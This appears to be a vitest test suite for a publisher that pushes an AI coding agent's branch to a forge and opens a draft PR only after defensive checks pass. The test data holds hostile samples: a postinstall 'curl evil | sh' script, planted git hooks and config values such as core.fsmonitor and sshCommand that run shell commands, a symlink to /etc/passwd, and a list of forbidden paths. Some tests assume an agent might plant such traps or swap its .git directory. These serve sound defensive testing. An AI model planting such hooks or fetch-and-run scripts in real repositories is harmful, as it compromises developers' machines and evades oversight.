import { execFileSync, spawnSync } from 'node:child_process';
import { existsSync, mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { describe, expect, it } from 'vitest';
import { execCmd, type Exec, type ExecResult } from '../adapters/exec.js';
import { FakeForge } from '../adapters/forge/fake.js';
import { NoCommitsBetween } from '../adapters/forge/types.js';
import { prText, PublishRefused, type PublishRequest } from '../adapters/publisher/types.js';
import { FakeSandboxProvider } from '../adapters/sandbox/fake.js';
import { GitWorkspaces } from '../adapters/workspace/git-workspaces.js';
import { WORKSPACE_TARGET, type SandboxExecOptions, type SandboxRequest } from '../adapters/sandbox/types.js';
import { forbiddenPattern } from '../checks/forbidden-paths.js';
import { BUNDLE_TARGET } from './extract.js';
import { GitPublisher } from './publish.js';

const BRANCH = 'factory/orc-1-x';
const git = (cwd: string, ...args: string[]) => execFileSync('git', args, { cwd, encoding: 'utf8' }).trim();

/** Runs each command on the host, in the dir its sandbox has as `/work`: the fake isolates nothing, the isolation suite proves that part. */
class LocalSandboxes extends FakeSandboxProvider {
  private byId = new Map<string, SandboxRequest>();
  scan?: (argv: readonly string[]) => ExecResult;
  gitleaks = 0;

  override async create(req: SandboxRequest) {
    const s = await super.create(req);
    this.byId.set(s.id, req);
    return s;
  }

  override async exec(id: string, argv: readonly string[], opts?: SandboxExecOptions): Promise<ExecResult> {
    await super.exec(id, argv, opts);
    const req = this.byId.get(id)!;
    const bundle = req.mounts.find((m) => m.target === BUNDLE_TARGET)?.host;
    const args = argv.map((a) => (bundle ? a.replace(BUNDLE_TARGET, bundle) : a));
    if (args.includes('gitleaks')) {
      this.gitleaks++;
      return this.scan?.(args) ?? { stdout: '[]', stderr: '', code: 0 };
    }
    const p = spawnSync(args[0]!, args.slice(1), { cwd: req.workspacePath, encoding: 'utf8' });
    return { stdout: p.stdout, stderr: p.stderr, code: p.status ?? 1 };
  }
}

const write = (repo: string, path: string, content: string) => {
  mkdirSync(dirname(join(repo, path)), { recursive: true });
  writeFileSync(join(repo, path), content);
};

const commit = (repo: string, message = 'work') => {
  git(repo, 'add', '-A');
  git(repo, 'commit', '-q', '-m', message);
  return git(repo, 'rev-parse', 'HEAD');
};

const identify = (repo: string) => {
  git(repo, 'config', 'user.email', 't@t');
  git(repo, 'config', 'user.name', 't');
};

/** A bare forge whose default branch has a commit, the agent's clone on its branch one commit ahead, and a publisher to that forge. */
function setup(o: { exec?: Exec; gitleaks?: boolean; package?: string; config?: string } = {}) {
  const base = mkdtempSync(join(tmpdir(), 'factory-publish-'));
  const remote = join(base, 'remote.git');
  git(base, 'init', '-q', '--bare', '-b', 'main', remote);
  const seed = join(base, 'seed');
  git(base, 'clone', '-q', remote, seed);
  identify(seed);
  git(seed, 'checkout', '-q', '-b', 'main');
  write(seed, 'README.md', 'base\n');
  if (o.package) write(seed, 'package.json', o.package);
  if (o.config) write(seed, '.factory/config.yml', o.config);
  commit(seed, 'base');
  git(seed, 'push', '-q', 'origin', 'main');

  const repo = join(base, 'agent');
  git(base, 'clone', '-q', remote, repo);
  identify(repo);
  git(repo, 'checkout', '-q', '-b', BRANCH);
  write(repo, 'a.txt', 'one\n');
  const sha = commit(repo);

  const forge = new FakeForge();
  forge.gitUrl = remote;
  const sandboxes = new LocalSandboxes();
  const logs: string[] = [];
  const pushes: string[][] = [];
  const exec: Exec = async (cmd, args, opts) => {
    if (args.includes('push')) pushes.push(args);
    return (o.exec ?? execCmd)(cmd, args, opts);
  };
  const publisher = new GitPublisher({ sandboxes, forge, runsDir: join(base, 'runs'), gitleaks: o.gitleaks ?? false, log: (m) => logs.push(m), exec });
  const request = (over: Partial<PublishRequest> = {}): PublishRequest => ({
    projectId: 'p', repoPath: repo, ticketId: 'ORC-1', runId: 'r1', worktree: repo, branch: BRANCH, sha: git(repo, 'rev-parse', 'HEAD'), title: 'ORC-1 x', body: 'b', ...over,
  });
  const onForge = (branch = BRANCH) => git(remote, 'for-each-ref', '--format=%(objectname)', `refs/heads/${branch}`);
  return { base, remote, seed, repo, sha, forge, sandboxes, logs, pushes, publisher, request, onForge };
}

async function refusal(p: Promise<unknown>): Promise<PublishRefused> {
  const err = await p.then(() => undefined, (e: unknown) => e);
  expect(err).toBeInstanceOf(PublishRefused);
  return err as PublishRefused;
}

/** Another client (a human) pushes a commit on the agent's branch, from what the forge holds of it or from main. */
function humanPush(s: ReturnType<typeof setup>, name = 'human.txt') {
  const human = join(s.base, `human-${name}`);
  git(s.base, 'clone', '-q', s.remote, human);
  identify(human);
  const known = s.onForge();
  git(human, 'checkout', '-q', '-b', BRANCH, ...(known ? [known] : []));
  write(human, name, 'human\n');
  const sha = commit(human, 'human');
  git(human, 'push', '-q', 'origin', `HEAD:refs/heads/${BRANCH}`);
  return sha;
}

describe('GitPublisher', () => {
  it('pushes the verified commit and opens a draft PR linked to the ticket (criterion 1)', async () => {
    const s = setup();
    const out = await s.publisher.publish(s.request());
    expect(s.onForge()).toBe(s.sha);
    expect(out).toEqual({ prNumber: 1, url: 'https://github.test/pr/1', sha: s.sha });
    expect(s.forge.opened).toEqual([{ number: 1, branch: BRANCH, base: 'main', title: 'ORC-1 x', body: 'b', draft: true }]);
    expect(s.onForge('main')).toBe(git(s.seed, 'rev-parse', 'HEAD'));
  });

  it('runs the extraction in a sandbox of its own, without network, destroyed once done', async () => {
    const s = setup();
    await s.publisher.publish(s.request());
    expect(s.sandboxes.created.map((c) => [c.runId, c.network])).toEqual([['r1-publish', 'none']]);
    expect(s.sandboxes.active()).toEqual([]);
  });

  describe('the diff check (criteria 2 and 3): nothing reaches the forge', () => {
    const blocked = async (s: ReturnType<typeof setup>, summary: RegExp) => {
      const sha = git(s.repo, 'rev-parse', 'HEAD');
      const r = await refusal(s.publisher.publish(s.request({ sha })));
      expect(r.code).toBe('diff');
      expect(r.message).toMatch(summary);
      expect(s.onForge()).toBe('');
      expect(s.pushes).toEqual([]);
      expect(s.forge.opened).toEqual([]);
    };

    it.each([
      '.github/workflows/ci.yml', '.factory/config.yml', '.claude/settings.json', '.gitattributes', '.gitmodules', '.npmrc', '.husky/pre-commit', '.vscode/tasks.json',
      'Dockerfile', 'Dockerfile.dev', '.devcontainer/devcontainer.json', 'claims/fact.md', 'sub/.npmrc',
      'CODEOWNERS', 'docs/CODEOWNERS', '.github/actions/setup/action.yml', '.github/dependabot.yml', '.env', '.env.local', 'setup.py', '.pnpmfile.cjs', '.yarnrc.yml',
    ])('a change of %s', async (path) => {
      const s = setup();
      write(s.repo, path, 'trap\n');
      commit(s.repo);
      await blocked(s, /forbidden path/);
    });

    it('.git/hooks and .git/config, which no commit can hold: named forbidden all the same, should a tree carry them', () => {
      expect(forbiddenPattern('.git/hooks/pre-push')).toBe('.git/hooks/**');
      expect(forbiddenPattern('.git/config')).toBe('.git/config');
    });

    describe("the repository's sensitive_paths, read on the base (ORC-338)", () => {
      const infra = () => {
        const s = setup({ config: 'sensitive_paths: ["infra/**"]\n' });
        git(s.repo, 'fetch', '-q', 'origin');
        git(s.repo, 'merge', '-q', '--no-edit', 'origin/main');
        write(s.repo, 'infra/main.tf', 'x\n');
        commit(s.repo);
        return s;
      };

      it('an untrusted branch that touches one is refused', async () => {
        const s = infra();
        const r = await refusal(s.publisher.publish(s.request({ untrusted: { since: '', humanPushes: [] } })));
        expect(r.code).toBe('diff');
        expect(r.message).toContain('`infra/main.tf`: sensitive path of the repository (`infra/**`)');
        expect(s.pushes).toEqual([]);
      });

      it('a trusted branch publishes it', async () => {
        const s = infra();
        await s.publisher.publish(s.request());
        expect(s.onForge()).toBe(git(s.repo, 'rev-parse', 'HEAD'));
      });

      it('a sensitive change a trusted run committed before the branch took untrusted content is published', async () => {
        const s = infra();
        const untrusted = { since: git(s.repo, 'rev-parse', 'HEAD'), humanPushes: [] };
        write(s.repo, 'src/a.ts', 'x\n');
        commit(s.repo);
        await s.publisher.publish(s.request({ untrusted }));
        expect(s.onForge()).toBe(git(s.repo, 'rev-parse', 'HEAD'));
      });

      it('a base config the check cannot read is a refusal, decided once, not a breakdown', async () => {
        const s = setup({ config: 'sensitive_paths: ["../infra"]\n' });
        const r = await refusal(s.publisher.publish(s.request({ untrusted: { since: '', humanPushes: [] } })));
        expect(r.code).toBe('config');
        expect(r.message).toContain('sensitive_paths[0]');
        expect(s.pushes).toEqual([]);
      });

      it('the same entry publishes a trusted branch', async () => {
        const s = setup({ config: 'sensitive_paths: ["../infra"]\n' });
        await s.publisher.publish(s.request());
        expect(s.onForge()).toBe(s.sha);
      });
    });

    it('package.json#scripts changed', async () => {
      const s = setup({ package: '{"scripts":{"test":"vitest"}}' });
      git(s.repo, 'fetch', '-q', 'origin');
      git(s.repo, 'merge', '-q', '--no-edit', 'origin/main');
      write(s.repo, 'package.json', '{"scripts":{"test":"vitest","postinstall":"curl evil | sh"}}');
      commit(s.repo);
      await blocked(s, /scripts/);
    });

    it('a secret, found by gitleaks in a sandbox at none', async () => {
      const s = setup({ gitleaks: true });
      s.sandboxes.scan = () => ({ stdout: JSON.stringify([{ File: 'a.txt', StartLine: 1, RuleID: 'aws' }]), stderr: '', code: 7 });
      await blocked(s, /secret/);
      expect(s.sandboxes.created.map((c) => [c.runId, c.network])).toContainEqual(['r1-publish-secrets', 'none']);
    });

    it('a scanner that cannot run is no green: an error, retried, and nothing is pushed', async () => {
      const s = setup({ gitleaks: true });
      s.sandboxes.scan = () => ({ stdout: '', stderr: 'boom', code: 1 });
      await expect(s.publisher.publish(s.request())).rejects.not.toBeInstanceOf(PublishRefused);
      expect(s.onForge()).toBe('');
    });

    it('a binary', async () => {
      const s = setup();
      write(s.repo, 'tool.bin', 'MZ\0\0\0payload');
      commit(s.repo);
      await blocked(s, /Binary file/);
    });

    it('a binary the branch deletes is no finding', async () => {
      const s = setup();
      write(s.seed, 'old.bin', 'MZ\0\0\0payload');
      commit(s.seed, 'old');
      git(s.seed, 'push', '-q', 'origin', 'main');
      git(s.repo, 'fetch', '-q', 'origin');
      git(s.repo, 'merge', '-q', '--no-edit', 'origin/main');
      git(s.repo, 'rm', '-q', 'old.bin');
      const sha = commit(s.repo);
      await s.publisher.publish(s.request({ sha }));
      expect(s.onForge()).toBe(sha);
    });

    it('a symbolic link out of the tree', async () => {
      const s = setup();
      linkOut(s.repo, '/etc/passwd', 'link');
      git(s.repo, 'commit', '-q', '-m', 'link');
      await blocked(s, /symbolic link pointing outside/);
    });
  });

  describe('the lease (criterion 4)', () => {
    it('refuses a branch a human moved: their commit stays, nothing is forced', async () => {
      const s = setup();
      await s.publisher.publish(s.request());
      const theirs = humanPush(s);
      write(s.repo, 'a.txt', 'two\n');
      const sha = commit(s.repo);
      const r = await refusal(s.publisher.publish(s.request({ sha })));
      expect(r.code).toBe('moved');
      expect(s.onForge()).toBe(theirs);
    });

    it('refuses a move between its read and its push: the lease is on the head it read', async () => {
      let theirs = '';
      const s = setup({
        exec: async (cmd, args, opts) => {
          if (args.includes('push') && !theirs) theirs = humanPush(s, 'race.txt');
          return execCmd(cmd, args, opts);
        },
      });
      const r = await refusal(s.publisher.publish(s.request()));
      expect(r.code).toBe('moved');
      expect(s.onForge()).toBe(theirs);
      expect(s.forge.opened).toEqual([]);
    });

    it('never rewrites: a branch the agent rebased over what the factory pushed is refused, the old head stays', async () => {
      const s = setup();
      await s.publisher.publish(s.request());
      git(s.repo, 'commit', '-q', '--amend', '-m', 'rewritten');
      const r = await refusal(s.publisher.publish(s.request()));
      expect(r.code).toBe('moved');
      expect(s.onForge()).toBe(s.sha);
    });

    it('goes fast-forward over a human commit the work already holds', async () => {
      const s = setup();
      await s.publisher.publish(s.request());
      const theirs = humanPush(s);
      git(s.repo, 'fetch', '-q', 'origin');
      git(s.repo, 'merge', '-q', '--ff-only', `origin/${BRANCH}`);
      expect(git(s.repo, 'rev-parse', 'HEAD')).toBe(theirs);
      write(s.repo, 'a.txt', 'two\n');
      const sha = commit(s.repo);
      await s.publisher.publish(s.request({ sha }));
      expect(s.onForge()).toBe(sha);
    });

    it('asks git for a lease and never a plain force', async () => {
      const s = setup();
      await s.publisher.publish(s.request());
      write(s.repo, 'a.txt', 'two\n');
      const sha = commit(s.repo);
      await s.publisher.publish(s.request({ sha }));
      expect(s.pushes).toHaveLength(2);
      expect(s.pushes[0]).toContain(`--force-with-lease=refs/heads/${BRANCH}:`);
      expect(s.pushes[1]).toContain(`--force-with-lease=refs/heads/${BRANCH}:${s.sha}`);
      for (const args of s.pushes) {
        expect(args.filter((a) => a === '--force' || a === '-f' || a.startsWith('+'))).toEqual([]);
      }
    });

    it('a refusal the forge gives (a protected branch) is an answer, a network failure an error', async () => {
      const said = (stdout: string, stderr: string) => setup({ exec: async (cmd, args, opts) => (args.includes('push') ? { stdout, stderr, code: 1 } : execCmd(cmd, args, opts)) });
      const protectedBranch = said('!\tx:y\t[remote rejected] (protected branch hook declined)', '');
      expect((await refusal(protectedBranch.publisher.publish(protectedBranch.request()))).code).toBe('rejected');
      const down = said('', 'fatal: unable to access: Could not resolve host');
      // What a server hook prints is not git's verdict.
      const talkative = said('!\tx:y\t[remote rejected] (declined)', 'remote: this is not a non-fast-forward');
      expect((await refusal(talkative.publisher.publish(talkative.request()))).code).toBe('rejected');
      await expect(down.publisher.publish(down.request())).rejects.not.toBeInstanceOf(PublishRefused);
    });
  });

  describe('idempotence (criterion 5)', () => {
    it('a replay finds the PR: nothing pushed, nothing opened again', async () => {
      const s = setup();
      const first = await s.publisher.publish(s.request());
      const created = s.sandboxes.created.length;
      const again = await s.publisher.publish(s.request());
      expect(again).toEqual(first);
      expect(s.pushes).toHaveLength(1);
      expect(s.forge.opened).toHaveLength(1);
      expect(s.sandboxes.created).toHaveLength(created);
    });

    it('a crash between the push and the PR: the replay pushes nothing, and opens the one PR', async () => {
      const s = setup();
      s.forge.offline = true;
      await expect(s.publisher.publish(s.request())).rejects.toThrow('forge unreachable');
      expect(s.onForge()).toBe(s.sha);
      s.forge.offline = false;
      const out = await s.publisher.publish(s.request());
      expect(out.prNumber).toBe(1);
      expect(s.pushes).toHaveLength(1);
      expect(s.forge.opened).toHaveLength(1);
    });

    it('a new commit keeps the PR', async () => {
      const s = setup();
      const first = await s.publisher.publish(s.request());
      write(s.repo, 'a.txt', 'two\n');
      const sha = commit(s.repo);
      const next = await s.publisher.publish(s.request({ sha }));
      expect(next).toEqual({ ...first, sha });
      expect(s.forge.opened).toHaveLength(1);
    });
  });

  it('a failure of its own git is no verdict: retried, never a refusal that names a human push', async () => {
    const s = setup({
      exec: async (cmd, args, opts) => (args.includes('merge-base') ? { stdout: '', stderr: 'fatal: out of memory', code: 128 } : execCmd(cmd, args, opts)),
    });
    await s.publisher.publish(s.request()).then(() => expect.unreachable(), (e: unknown) => expect(e).not.toBeInstanceOf(PublishRefused));
    expect(s.onForge()).toBe('');
    const later = setup({
      exec: async (cmd, args, opts) => (args.includes('--is-ancestor') ? { stdout: '', stderr: 'fatal: out of memory', code: 128 } : execCmd(cmd, args, opts)),
    });
    await later.publisher.publish(later.request());
    write(later.repo, 'a.txt', 'two\n');
    const sha = commit(later.repo);
    await later.publisher.publish(later.request({ sha })).then(() => expect.unreachable(), (e: unknown) => expect(e).not.toBeInstanceOf(PublishRefused));
  });

  it('a branch without a common history with the base is diffed whole, not a failure', async () => {
    const s = setup();
    git(s.repo, 'checkout', '-q', '--orphan', 'other');
    git(s.repo, 'branch', '-q', '-D', BRANCH);
    git(s.repo, 'checkout', '-q', '-b', BRANCH);
    const sha = commit(s.repo, 'orphan');
    await s.publisher.publish(s.request({ sha }));
    expect(s.onForge()).toBe(sha);
  });

  describe('what it refuses before any check', () => {
    it('a branch whose head is not the verified commit: never another commit than the green one', async () => {
      const s = setup();
      const verified = s.sha;
      write(s.repo, 'a.txt', 'later\n');
      commit(s.repo);
      const r = await refusal(s.publisher.publish(s.request({ sha: verified })));
      expect(r.code).toBe('head');
      expect(s.onForge()).toBe('');
    });

    it('the default branch', async () => {
      const s = setup();
      const r = await refusal(s.publisher.publish(s.request({ branch: 'main' })));
      expect(r.code).toBe('trunk');
      expect(s.pushes).toEqual([]);
    });

    it('a branch already on the forge with nothing beyond the base: the PR the forge refuses to open is an answer, not a failure', async () => {
      const s = setup();
      const ensurePr = s.forge.ensurePr.bind(s.forge);
      let calls = 0;
      s.forge.ensurePr = async (...args) => {
        calls++;
        if (calls === 2) throw new NoCommitsBetween('422 No commits between main and factory/orc-1-x');
        return ensurePr(...args);
      };
      await s.publisher.publish(s.request());
      const r = await refusal(s.publisher.publish(s.request()));
      expect(r.code).toBe('empty');
    });

    it('a branch with nothing beyond the base: no push, no PR', async () => {
      const s = setup();
      git(s.repo, 'reset', '-q', '--hard', 'origin/main');
      const r = await refusal(s.publisher.publish(s.request()));
      expect(r.code).toBe('empty');
      expect(s.pushes).toEqual([]);
      expect(s.forge.opened).toEqual([]);
    });
  });

  it('runs nothing the agent left in its repository: neither a hook nor a config', async () => {
    const s = setup();
    const trap = join(s.base, 'TRAPPED');
    const script = `#!/bin/sh\ntouch "${trap.replace(/\\/g, '/')}"\n`;
    for (const hook of ['pre-push', 'post-checkout', 'reference-transaction', 'pre-commit']) writeFileSync(join(s.repo, '.git', 'hooks', hook), script, { mode: 0o755 });
    git(s.repo, 'config', 'core.fsmonitor', `sh -c 'touch "${trap.replace(/\\/g, '/')}"'`);
    await s.publisher.publish(s.request());
    expect(s.onForge()).toBe(s.sha);
    expect(spawnSync('test', ['-e', trap]).status).not.toBe(0);
  });

  it('gives git its credentials through the environment: never on a command line, never in an error', async () => {
    const seen: { args: string[]; env: Record<string, string> | undefined }[] = [];
    const s = setup({
      exec: async (cmd, args, opts) => {
        seen.push({ args, env: opts?.env });
        return args.includes('push') ? { stdout: '', stderr: 'fatal: unable to access', code: 128 } : execCmd(cmd, args, opts);
      },
    });
    s.forge.gitEnv = { GIT_CONFIG_COUNT: '1', GIT_CONFIG_KEY_0: 'http.https://github.com/.extraheader', GIT_CONFIG_VALUE_0: 'Authorization: Basic SECRET' };
    const err = (await s.publisher.publish(s.request()).catch((e: Error) => e)) as Error;
    expect(err.message).not.toContain('SECRET');
    const push = seen.find((c) => c.args.includes('push'))!;
    expect(push.env?.['GIT_CONFIG_VALUE_0']).toContain('SECRET');
    expect(seen.flatMap((c) => c.args).join(' ')).not.toContain('SECRET');
    expect(s.logs.join(' ')).not.toContain('SECRET');
  });

  it('removes its work dir, whatever happens', async () => {
    const s = setup();
    write(s.repo, '.npmrc', 'x\n');
    commit(s.repo);
    await refusal(s.publisher.publish(s.request()));
    const left = spawnSync('find', [join(s.base, 'runs').replace(/\\/g, '/'), '-mindepth', '2', '-name', 'publish-*'], { encoding: 'utf8' });
    expect(left.stdout.trim()).toBe('');
  });
});

describe('GitPublisher, on the repository the agent really has (ORC-317)', () => {
  /** The forge, the factory's clone of it, and the agent's own repository as `GitWorkspaces` makes it: its `.git` inside its worktree. Every git of the host is recorded. */
  async function realLayout() {
    const base = mkdtempSync(join(tmpdir(), 'factory-publish-layout-'));
    const remote = join(base, 'remote.git');
    git(base, 'init', '-q', '--bare', '-b', 'main', remote);
    const repoPath = join(base, 'repo');
    git(base, 'clone', '-q', remote, repoPath);
    identify(repoPath);
    git(repoPath, 'config', 'core.autocrlf', 'false');
    git(repoPath, 'checkout', '-q', '-b', 'main');
    write(repoPath, 'README.md', 'base\n');
    commit(repoPath, 'base');
    git(repoPath, 'push', '-q', '-u', 'origin', 'main');
    git(repoPath, 'remote', 'set-head', 'origin', 'main');
    const ws = await new GitWorkspaces({ root: join(base, 'ws') }).prepare({ projectId: 'p', repoPath, ticketId: 'ORC-1', title: 'x', kind: 'worktree', slot: 0, portBase: 4200, runId: 'r0' } as never);
    const work = ws.path;
    const branch = ws.branch!;
    write(work, 'a.txt', 'one\n');
    const sha = commit(work);

    const forge = new FakeForge();
    forge.gitUrl = remote;
    const sandboxes = new LocalSandboxes();
    const hostGit: { args: string[]; cwd: string | undefined }[] = [];
    const exec: Exec = async (cmd, args, opts) => {
      hostGit.push({ args, cwd: opts?.cwd });
      return execCmd(cmd, args, opts);
    };
    const publisher = new GitPublisher({ sandboxes, forge, runsDir: join(base, 'runs'), gitleaks: false, log: () => {}, exec });
    const request = (over: Partial<PublishRequest> = {}): PublishRequest => ({ projectId: 'p', repoPath, ticketId: 'ORC-1', runId: 'r1', worktree: work, branch, sha, title: 'ORC-1 x', body: 'b', ...over });
    const onForge = () => git(remote, 'for-each-ref', '--format=%(objectname)', `refs/heads/${branch}`);
    return { base, remote, repoPath, work, branch, sha, forge, sandboxes, hostGit, publisher, request, onForge };
  }

  it('the layout is the one this test means: a git dir of its own, no link to the repository of the factory', async () => {
    const s = await realLayout();
    expect(git(s.work, 'rev-parse', '--git-common-dir')).toBe('.git');
    expect(git(s.work, 'rev-parse', '--abbrev-ref', 'HEAD')).toBe(s.branch);
  });

  it('publishes from it: pushed, a draft PR, and a next commit goes forward under the lease', async () => {
    const s = await realLayout();
    await s.publisher.publish(s.request());
    expect(s.onForge()).toBe(s.sha);
    expect(s.forge.opened).toEqual([expect.objectContaining({ branch: s.branch, base: 'main', draft: true })]);
    write(s.work, 'a.txt', 'two\n');
    const next = commit(s.work);
    await s.publisher.publish(s.request({ sha: next }));
    expect(s.onForge()).toBe(next);
    expect(s.forge.opened).toHaveLength(1);
  });

  it("mounts the agent's own git dir, read-only over its worktree, and never the factory's", async () => {
    const s = await realLayout();
    await s.publisher.publish(s.request());
    const [box] = s.sandboxes.created;
    expect(box!.mounts).toContainEqual({ host: join(s.work, '.git'), target: `${WORKSPACE_TARGET}/.git`, readOnly: true });
    expect(s.sandboxes.created.flatMap((c) => c.mounts).map((m) => m.host).filter((h) => h.startsWith(s.repoPath))).toEqual([]);
  });

  it("runs no git of the host in the agent's directory: its bundle is the sandbox's, its lease and its base the clone's", async () => {
    const s = await realLayout();
    await s.publisher.publish(s.request());
    expect(s.hostGit.length).toBeGreaterThan(3);
    for (const { args, cwd } of s.hostGit) {
      expect(cwd ?? '', args.join(' ')).not.toContain(s.work);
      expect(args.join(' ')).not.toContain(s.work);
    }
  });

  it('what the agent left in its git dir never runs, on the host nor at the push', async () => {
    const s = await realLayout();
    const trap = join(s.base, 'TRAPPED').replace(/\\/g, '/');
    mkdirSync(join(s.work, '.git', 'hooks'), { recursive: true });
    for (const hook of ['pre-push', 'reference-transaction', 'post-checkout', 'pre-auto-gc']) writeFileSync(join(s.work, '.git', 'hooks', hook), `#!/bin/sh\ntouch "${trap}"\n`, { mode: 0o755 });
    for (const [key, value] of [['core.fsmonitor', `sh -c 'touch "${trap}"'`], ['core.sshCommand', `sh -c 'touch "${trap}"'`], ['core.hooksPath', '.git/hooks'], ['remote.origin.uploadpack', `sh -c 'touch "${trap}"'`]] as const) git(s.work, 'config', key, value);
    await s.publisher.publish(s.request());
    expect(s.onForge()).toBe(s.sha);
    expect(existsSync(trap)).toBe(false);
  });

  it("a .git the agent replaced by a file pointing at the factory's: refused, and that dir is mounted nowhere", async () => {
    const s = await realLayout();
    rmSync(join(s.work, '.git'), { recursive: true, force: true });
    writeFileSync(join(s.work, '.git'), `gitdir: ${join(s.repoPath, '.git')}\n`);
    const r = await refusal(s.publisher.publish(s.request()));
    expect(r.code).toBe('head');
    expect(s.sandboxes.created).toEqual([]);
    expect(s.onForge()).toBe('');
  });
});

describe('prText', () => {
  it("names the ticket, and copies nothing of the agent's: no last message reaches GitHub", () => {
    const { title, body } = prText({ ticketId: 'ORC-1', title: 'Exporter en CSV' });
    expect(title).toBe('ORC-1 Exporter en CSV');
    expect(body).toContain('Ticket: ORC-1');
    // A closing keyword is a claim about the whole ticket: only ORC-195's composer can make it.
    expect(body).not.toMatch(/\b(fix(es)?|close[sd]?|resolve[sd]?)\b/i);
  });
});

/** A symbolic link in the index, as git records one: Windows gives no right to make one on disk. */
function linkOut(repo: string, target: string, path: string) {
  const blob = execFileSync('git', ['hash-object', '-w', '--stdin'], { cwd: repo, input: target, encoding: 'utf8' }).trim();
  git(repo, 'update-index', '--add', '--cacheinfo', `120000,${blob},${path}`);
}
